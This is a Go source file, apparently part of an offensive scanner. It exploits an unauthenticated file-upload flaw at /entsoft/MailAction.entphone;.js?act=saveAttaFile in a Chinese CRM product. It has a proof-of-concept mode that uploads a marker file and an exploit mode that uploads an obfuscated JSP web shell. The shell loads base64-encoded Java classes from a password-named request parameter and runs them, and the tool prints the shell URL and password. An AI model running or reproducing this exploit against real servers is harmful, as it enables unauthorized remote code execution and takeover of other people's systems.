package vulnerable

import (
	"bytes"
	"compress/gzip"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/thanhpk/randstr"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"os"
	"strings"
)

type Result struct {
	VisitRoot string `json:"visitRoot"`
}

var ShellStr string

func EntPhoneSaveAttaFileWorker(mode, target, proxyAddr string) {
	Password := randstr.Hex(8)
	Filename := randstr.Hex(8) + ".jsp"
	if mode == strings.ToLower("poc") {
		ShellStr = "浙大恩特CRM系统[/entsoft/MailAction.entphone;.js?act=saveAttaFile]文件上传漏洞验证测试"
	} else if mode == strings.ToLower("exp") {
		ShellStr = "<%!\nclass HYPERLINK extends ClassLoader{\n  HYPERLINK(ClassLoader c){super(c);}\n  public Class snake_case(byte[] b){\n    return super.defineClass(b, 0, b.length);\n  }\n}\npublic byte[] manipulator(String str) throws Exception {\n  Class base64;\n  byte[] value = null;\n  try {\n    base64=Class.forName(\"sun.misc.BASE64Decoder\");\n    Object decoder = base64.newInstance();\n    value = (byte[])decoder.getClass().getMethod(\"decodeBuffer\", new Class[] {String.class }).invoke(decoder, new Object[] { str });\n  } catch (Exception e) {\n    try {\n      base64=Class.forName(\"java.util.Base64\");\n      Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n      value = (byte[])decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { str });\n    } catch (Exception ee) {}\n  }\n  return value;\n}\n%>\n<%\nString cls = request.getParameter(\"" + Password + "\");\nif (cls != null) {\n  new HYPERLINK(this.getClass().getClassLoader()).snake_case(manipulator(cls)).newInstance().equals(new Object[]{request,response});\n}\n%>"
		urlForShell, err := uploader(target, Filename, ShellStr, proxyAddr)
		if err != nil {
			fmt.Println(err)
			os.Exit(0)
		}
		fmt.Println(urlForShell, Password)
		return
	}
	urlForShell, err := uploader(target, Filename, ShellStr, proxyAddr)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	resp, _ := http.Get(urlForShell)
	all, _ := ioutil.ReadAll(resp.Body)
	if string(all) == "浙大恩特CRM系统[/entsoft/MailAction.entphone;.js?act=saveAttaFile]文件上传漏洞验证测试" {
		fmt.Printf("站点存在此漏洞,Shell页面显示\n%s\n", all)
	}
}

func uploader(targetHost, filename, ShellContent, proxy string) (shellURL string, err error) {
	vulURL := "/entsoft/MailAction.entphone;.js?act=saveAttaFile"
	reqHost := strings.Replace(targetHost+vulURL, "//ent", "/ent", 1)
	buffer := &bytes.Buffer{}
	writer := multipart.NewWriter(buffer)
	_, _ = writer.CreateFormFile("file", filename)
	buffer.WriteString(ShellContent)
	_ = writer.Close()
	request, err := http.NewRequest(http.MethodPost, reqHost, strings.NewReader(buffer.String()))
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	cli := HttpCli(proxy)
	request.Header.Set("Content-Type", writer.FormDataContentType())
	request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36")
	request.Header.Set("Accept-Encoding", "gzip")
	do, err := cli.Do(request)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	defer func() {
		_ = do.Body.Close()
	}()
	if do.StatusCode != http.StatusOK {
		return "", nil
	}
	reader, _ := gzip.NewReader(do.Body)
	all, _ := ioutil.ReadAll(reader)
	var result Result
	_ = json.Unmarshal(all, &result)
	if result.VisitRoot != "" {
		split := strings.Split(result.VisitRoot, "null")
		shellURL := strings.Replace(targetHost+split[1], "//ent", "/ent", 1)
		return shellURL, nil
	}
	return "", errors.New("传了个寂寞")
}
